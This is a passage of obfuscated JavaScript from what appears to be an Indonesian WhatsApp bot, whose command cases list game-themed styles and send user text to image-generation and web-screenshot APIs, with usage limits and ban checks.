            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *bg1*\x0a│2 ▸ *bg2*\x0a│3 ▸ *bg3*\x0a│4 ▸ *bg4*\x0a│5 ▸ *bg5*\x0a│6 ▸ *bg6*\x0a│7 ▸ *bg7*\x0a│8 ▸ *bg8*\x0a│9 ▸ *bg9*\x0a│10 ▸ *bg10*\x0a│11 ▸ *bg11*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'listbannerofapex': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x909));
        }
        break;
        case _0x5804c8(0xaf4): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *widowmaker*\x0a│2 ▸ *tracer*\x0a│3 ▸ *symmetra*\x0a│4 ▸ *sombra*\x0a│5 ▸ *soldier76*\x0a│6 ▸ *reinhardt*\x0a│7 ▸ *reaper*\x0a│8 ▸ *orisa*\x0a│9 ▸ *mercy*\x0a│10 ▸ *mei*\x0a│11 ▸ *genji*\x0a│12 ▸ *dva*\x0a│13 ▸ *doomfist*\x0a│14 ▸ *ashe*\x0a│15 ▸ *ana*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'listbanneroffreefire': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *andrew*\x0a│2 ▸ *kelly*\x0a│3 ▸ *caroline*\x0a│4 ▸ *laura*\x0a│5 ▸ *maxim*\x0a│6 ▸ *miguel*\x0a│7 ▸ *misha*\x0a│8 ▸ *moco*\x0a│9 ▸ *nikita*\x0a│10 ▸ *notora*\x0a│11 ▸ *olivia*\x0a│12 ▸ *steffi*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'listgunlogogaming': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *ak47*\x0a│2 ▸ *ak47-s*\x0a│3 ▸ *an94*\x0a│4 ▸ *ar15*\x0a│5 ▸ *aug*\x0a│6 ▸ *awm*\x0a│7 ▸ *g36k*\x0a│8 ▸ *m4a1*\x0a│9 ▸ *m4-s*\x0a│10 ▸ *m14ebr*\x0a│11 ▸ *m16*\x0a│12 ▸ *m60*\x0a│13 ▸ *m82a1*\x0a│14 ▸ *mp5*\x0a│15 ▸ *scar*\x0a│16 ▸ *svd*\x0a│17 ▸ *xm8*\x0a│18 ▸ *xm1014*\x0a│\x0a╰────────────˧');
        }
        break;
        case _0x5804c8(0xd86): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x34d));
        }
        break;
        case _0x5804c8(0x812): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xc3a));
        }
        break;
        case _0x5804c8(0xa32): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x7f0));
        }
        break;
        case 'pencilsketch': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x506) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x506) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], m3 = mm[_0x5804c8(0x4bd)]('|')[0x2], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x2e4564 = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + '&text2=' + m2 + '&icon=' + m3 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x2e4564,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })['catch'](_0x566015 => {
                const _0x1e0db7 = _0x5804c8;
                _0x358f3b(_0x1e0db7(0x26f));
            });
        }
        break;
        case _0x5804c8(0x7f9): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x813));
        }
        break;
        case _0x5804c8(0x9b8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1a0) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|text2|character*\x0a*Untuk List Character Ketik .list' + _0x453fc1 + '*');
            mm = _0x83eae5['join'](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], m3 = mm[_0x5804c8(0x4bd)]('|')[0x2], _0x358f3b(mess['wait']);
            let _0x414953 = await getBuffer('https://api.zeeoneofc.my.id/api/ephoto360/' + _0x453fc1 + '?text=' + m1 + _0x5804c8(0xb28) + m2 + _0x5804c8(0xbc8) + m3 + '&apikey=' + _0x932571['BotKey']);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x414953,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x341fa1 => {
                const _0x32926d = _0x5804c8;
                _0x358f3b(_0x32926d(0x26f));
            });
        }
        break;
        case _0x5804c8(0x840): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('\"peura\",\x0a\"rouie-5\",\x0a\"roxie-2\",\x0a\"sinestrea-4\",\x0a\"tachi\",\x0a\"telannas-7\",\x0a\"tulen-7\",\x0a\"veera-3\",\x0a\"veera-4\",\x0a\"veres-6\",\x0a\"violet-7\",\x0a\"wukong-3\",\x0a\"annette-6\",\x0a\"astrid-5\",\x0a\"bright-2\",\x0a\"butterfly-4\",\x0a\"butterfly-5\",\x0a\"diao-chan\",\x0a\"enzo-4\",\x0a\"helen\",\x0a\"iggy-3\",\x0a\"ilumia-4\",\x0a\"ishar-5\",\x0a\"lauriel-7\",\x0a\"mina-4\",\x0a\"annette-5\",\x0a\"aoi-3\",\x0a\"arum-3\",\x0a\"azzenka\",\x0a\"bright\",\x0a\"capheny-6\",\x0a\"celica-2\",\x0a\"elsu-3\",\x0a\"ilumia-3\",\x0a\"ishar-4\",\x0a\"kahlii-2\",\x0a\"lauriel-6\",\x0a\"laville-4\",\x0a\"liliana-6\",\x0a\"mina-3\",\x0a\"paine\",\x0a\"rouie-4\",\x0a\"veres5\",\x0a\"murad-6\",\x0a\"veres-2\",\x0a\"tulen-5\",\x0a\"lindis-2\",\x0a\"dextra\",\x0a\"nakroth-6\",\x0a\"sephera3\",\x0a\"darcy2\",\x0a\"capheny4\",\x0a\"astrid4\",\x0a\"yorn2\",\x0a\"airi4\",\x0a\"sinestrea2\",\x0a\"sinestrea1\",\x0a\"zephys2\",\x0a\"yena4\",\x0a\"volkath3\",\x0a\"tulen4\",\x0a\"thorne\",\x0a\"quillen5\",\x0a\"nakroth5\",\x0a\"laville3\",\x0a\"hayate4\",\x0a\"florentino3\",\x0a\"butterfly3\",\x0a\"amily3\",\x0a\"annette4\",\x0a\"allain\",\x0a\"arum2\",\x0a\"astrid3\",\x0a\"ata2\",\x0a\"ata\",\x0a\"butterfly2\",\x0a\"capheny3\",\x0a\"dirak\",\x0a\"elandorr2\",\x0a\"elandorr\",\x0a\"florentino2\",\x0a\"hayate3\",\x0a\"ilumia2\",\x0a\"ishar3\",\x0a\"jinna2\",\x0a\"keera\",\x0a\"lauriel4\",\x0a\"laville2\",\x0a\"laville\",\x0a\"liliana4\",\x0a\"lubu2\",\x0a\"mganga2\",\x0a\"murad5\",\x0a\"nakroth4\",\x0a\"omen2\",\x0a\"paine\",\x0a\"preyta\",\x0a\"qi2\",\x0a\"quillen4\",\x0a\"rouie2\",\x0a\"rouie\",\x0a\"skud2\",\x0a\"taara\",\x0a\"telannas4\",\x0a\"valhein3\",\x0a\"valhein2\",\x0a\"violet5\",\x0a\"violet4\",\x0a\"yena3\",\x0a\"yena2\",\x0a\"zata\",\x0a\"zata2\",\x0a\"enzo\",\x0a\"hayate2\",\x0a\"krixi2\",\x0a\"krizziz\",\x0a\"murad4\",\x0a\"volkath2\",\x0a\"volkath\",\x0a\"wukong2\",\x0a\"arduin2\",\x0a\"mina2\",\x0a\"zuka2\",\x0a\"wisp2\",\x0a\"errol2\",\x0a\"ishar2\",\x0a\"lubu&diaochan\",\x0a\"maloch\",\x0a\"ormarr\",\x0a\"thane\",\x0a\"tulen&butterfly\",\x0a\"ishar\",\x0a\"tulen3\",\x0a\"butterfly\",\x0a\"lauriel3\",\x0a\"liliana3\",\x0a\"nakroth3\",\x0a\"baldum\",\x0a\"lauriel2\",\x0a\"celica\",\x0a\"annette3\",\x0a\"capheny2\",\x0a\"gildur2\",\x0a\"quillen2\",\x0a\"sephera2\",\x0a\"ryoma2\",\x0a\"tulen2\",\x0a\"tulen1\",\x0a\"qi\",\x0a\"liliana2\",\x0a\"murad3\",\x0a\"zephys\",\x0a\"zip2\",\x0a\"airi3\",\x0a\"amily2\",\x0a\"astrid2\",\x0a\"lauriel\",\x0a\"nakroth2\",\x0a\"violet3\",\x0a\"airi2\",\x0a\"alice3\",\x0a\"arduin\",\x0a\"elsu2\",\x0a\"ignis\",\x0a\"jinna\",\x0a\"joker\",\x0a\"kilgroth\",\x0a\"lubu\",\x0a\"marja\",\x0a\"moren\",\x0a\"payna\",\x0a\"ryoma\",\x0a\"skud\",\x0a\"superman\",\x0a\"valhein\",\x0a\"xeniel\",\x0a\"zill\",\x0a\"yena\",\x0a\"zip\",\x0a\"sephera\",\x0a\"aleister\",\x0a\"alice2\",\x0a\"annette2\",\x0a\"arthur\",\x0a\"arum\",\x0a\"astrid\",\x0a\"darcy\",\x0a\"batman\",\x0a\"errol\",\x0a\"fennik\",\x0a\"flash\",\x0a\"florentino\",\x0a\"gildur\",\x0a\"grakk\",\x0a\"hayate\",\x0a\"kahlii\",\x0a\"mganga\",\x0a\"mina\",\x0a\"murad2\",\x0a\"omen\",\x0a\"richter\",\x0a\"rourke\",\x0a\"telannas2\",\x0a\"toro\",\x0a\"violet2\",\x0a\"wonderwomen\",\x0a\"roxie\",\x0a\"natalya\",\x0a\"airi\",\x0a\"amily\",\x0a\"annette\",\x0a\"elsu\",\x0a\"ilumia\",\x0a\"alice\",\x0a\"zuka\",\x0a\"wisp\",\x0a\"wiro\",\x0a\"veres\",\x0a\"quillen\",\x0a\"lindis\",\x0a\"krixi\",\x0a\"murad\",\x0a\"liliana\",\x0a\"enzo\",\x0a\"diaochan\",\x0a\"capheny\",\x0a\"veera\",\x0a\"tulen\",\x0a\"slimz\",\x0a\"yorn\",\x0a\"violet\",\x0a\"telannas\",\x0a\"raz\",\x0a\"wukong\",\x0a\"nakroth\"');
        }
        break;
        case _0x5804c8(0xa2c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x584) + _0x453fc1 + '*');
            if (!q['includes']('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x584) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm['split']('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x227f8d = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0x39e) + m2 + _0x5804c8(0xcc7) + _0x932571['BotKey']);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x227f8d,
                'caption': 'Done kak'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x52f279 => {
                const _0x470911 = _0x5804c8;
                _0x358f3b(_0x470911(0x26f));
            });
        }
        break;
        case _0x5804c8(0x727): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xa5c));
        }
        break;
        case _0x5804c8(0xa31):
        case _0x5804c8(0x7e1):
        case 'astronotspace':
        case _0x5804c8(0x91b): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|style*\x0a*Untuk List Style Ketik .list' + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|style*\x0a*Untuk List Style Ketik .list' + _0x453fc1 + '*');
            mm = _0x83eae5['join'](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x415465 = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0x417) + m2 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x415465,
                'caption': 'Done kak'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x4dae9e => {
                const _0x58efd0 = _0x5804c8;
                _0x358f3b(_0x58efd0(0x26f));
            });
        }
        break;
        case _0x5804c8(0x520): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x254));
        }
        break;
        case _0x5804c8(0x4b4): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST STYLE*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *women*\x0a│2 ▸ *nen*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'listastronotspace': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x975));
        }
        break;
        case _0x5804c8(0x955): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x3cc));
        }
        break;
        case _0x5804c8(0xb3a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|color*\x0a*Untuk List Color Ketik .list' + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x141) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x1a6e35 = await getBuffer('https://api.zeeoneofc.my.id/api/ephoto360/' + _0x453fc1 + '?text=' + m1 + _0x5804c8(0x973) + m2 + '&apikey=' + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x1a6e35,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })['catch'](_0x50a65d => {
                _0x358f3b('*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*');
            });
        }
        break;
        case 'listcolorfulpubg': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6ad));
        }
        break;
        case 'metalmascot':
        case _0x5804c8(0x3fb):
        case 'circlemascotteam':
        case _0x5804c8(0x4eb): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x604) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x604) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x1f59d = await getBuffer('https://api.zeeoneofc.my.id/api/ephoto360/' + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xa11) + m2 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x1f59d,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })['catch'](_0x432697 => {
                const _0x271866 = _0x5804c8;
                _0x358f3b(_0x271866(0x26f));
            });
        }
        break;
        case _0x5804c8(0xba4): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST LOGO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *snakelion*\x0a│2 ▸ *dragon*\x0a│3 ▸ *eagle*\x0a│4 ▸ *falcon*\x0a│5 ▸ *fox*\x0a│6 ▸ *lion*\x0a│7 ▸ *panther*\x0a│8 ▸ *phoenix*\x0a│9 ▸ *rhino*\x0a│10 ▸ *squirrel*\x0a│11 ▸ *unicorn*\x0a│12 ▸ *tiger*\x0a│13 ▸ *zebra* \x0a│14 ▸ *wolf* \x0a│\x0a╰────────────˧');
        }
        break;
        case _0x5804c8(0xb4f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x660));
        }
        break;
        case _0x5804c8(0xa9d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST LOGO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *panther*\x0a│2 ▸ *rhino*\x0a│3 ▸ *squirrel*\x0a│4 ▸ *unicorn*\x0a│5 ▸ *zebra*\x0a│6 ▸ *lionsnake*\x0a│7 ▸ *bear*\x0a│8 ▸ *bull*\x0a│9 ▸ *dragon*\x0a│10 ▸ *eagle*\x0a│11 ▸ *fox*\x0a│12 ▸ *griffin*\x0a│13 ▸ *hawk*\x0a│14 ▸ *lion*\x0a│15 ▸ *peacock*\x0a│16 ▸ *phoenix*\x0a│17 ▸ *tiger*\x0a│18 ▸ *wolver*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'listcutegirlgamer': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x605));
        }
        break;
        case _0x5804c8(0x729): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|background*\x0a*Untuk List Background Ketik .list' + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbd8) + _0x453fc1 + '*');
            mm = _0x83eae5['join'](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm['split']('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x50de19 = await getBuffer('https://api.zeeoneofc.my.id/api/ephoto360/' + _0x453fc1 + _0x5804c8(0xbb0) + m1 + '&background=' + m2 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x50de19,
                'caption': 'Done kak'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x28fe6a => {
                const _0x2ae484 = _0x5804c8;
                _0x358f3b(_0x2ae484(0x26f));
            });
        }
        break;
        case _0x5804c8(0x823): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *beach-1*\x0a│2 ▸ *beach-2*\x0a│3 ▸ *beach-3*\x0a│4 ▸ *beach-4*\x0a│5 ▸ *beach-5*\x0a│6 ▸ *beach-6*\x0a│\x0a╰────────────˧');
        }
        break;
        case 'coverbannerlol':
        case _0x5804c8(0xd05):
        case _0x5804c8(0x9ae): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x48b) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x48b) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm['split']('|')[0x0], m2 = mm['split']('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x9bcbba = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + '&heroes=' + m2 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x9bcbba,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x3ed96e => {
                const _0x14586a = _0x5804c8;
                _0x358f3b(_0x14586a(0x26f));
            });
        }
        break;
        case _0x5804c8(0x5dc): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x5fc));
        }
        break;
        case _0x5804c8(0x9e0): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcf8));
        }
        break;
        case 'listwallpaperml': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x9ec));
        }
        break;
        case _0x5804c8(0x6cc): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x174) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|text2|banner*\x0a*Untuk List Banner Ketik .list' + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], m3 = mm[_0x5804c8(0x4bd)]('|')[0x2], _0x358f3b(mess['wait']);
            let _0x1d2241 = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xb28) + m2 + _0x5804c8(0x78a) + m3 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x1d2241,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })['catch'](_0x47a9b2 => {
                const _0x5ae475 = _0x5804c8;
                _0x358f3b(_0x5ae475(0x26f));
            });
        }
        break;
        case _0x5804c8(0x467): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x881));
        }
        break;
        case 'dragonballfb': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbe7) + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xbe7) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm['split']('|')[0x1], _0x358f3b(mess['wait']);
            let _0x2bf4eb = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xbc8) + m2 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x2bf4eb,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0xee67b2 => {
                const _0x573b6 = _0x5804c8;
                _0x358f3b(_0x573b6(0x26f));
            });
        }
        break;
        case _0x5804c8(0x948): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x701));
        }
        break;
        case 'ssweb': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd10) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x14b));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0xca031a = await getBuffer('https://skizo.tech/api/ssweb?type=dekstop&url=' + _0x1b04cf + '&apikey=' + _0x932571[_0x5804c8(0x342)]);
            try {
